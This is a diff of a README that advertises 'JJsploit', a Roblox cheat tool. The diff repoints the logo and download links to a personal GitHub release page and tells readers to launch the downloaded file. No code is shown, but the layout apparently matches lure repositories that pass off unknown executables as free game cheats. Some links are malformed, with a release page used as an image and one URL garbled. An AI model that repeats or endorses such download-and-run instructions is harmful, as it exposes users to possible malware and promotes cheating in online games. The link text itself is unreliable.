@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **JJsploit**, a powerful Roblox exploit designed to enhance your gaming experience! 😎
 
-![JJsploit Logo](https://example.com/jjsploit-logo.png)
+![JJsploit Logo](https://github.com/pedrin01448/JJsploit/releases/tag/v1.0)
 
 ## Repository Description
 **JJSploit**, now available for free, is a widely-used Roblox exploit favored for its simplicity and accessibility. With the ability to execute Lua scripts, it enables users to customize their gaming experience, though users should remain vigilant about potential risks associated with exploiting software. If you're looking to take your Roblox gameplay to the next level, look no further than JJsploit! ✨
@@ -26,7 +26,7 @@ Welcome to the official repository of **JJsploit**, a powerful Roblox exploit de
 ## Downloads
 Click the button below to download the latest version of JJsploit:
 
-[![Download JJsploit](https://img.shields.io/badge/Download%20JJsploit-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download JJsploit](https://github.com/pedrin01448/JJsploit/releases/tag/v1.0%https://github.com/pedrin01448/JJsploit/releases/tag/v1.0)](https://github.com/pedrin01448/JJsploit/releases/tag/v1.0)
 
 Make sure to launch the downloaded file to start using JJsploit right away! 🚀
 
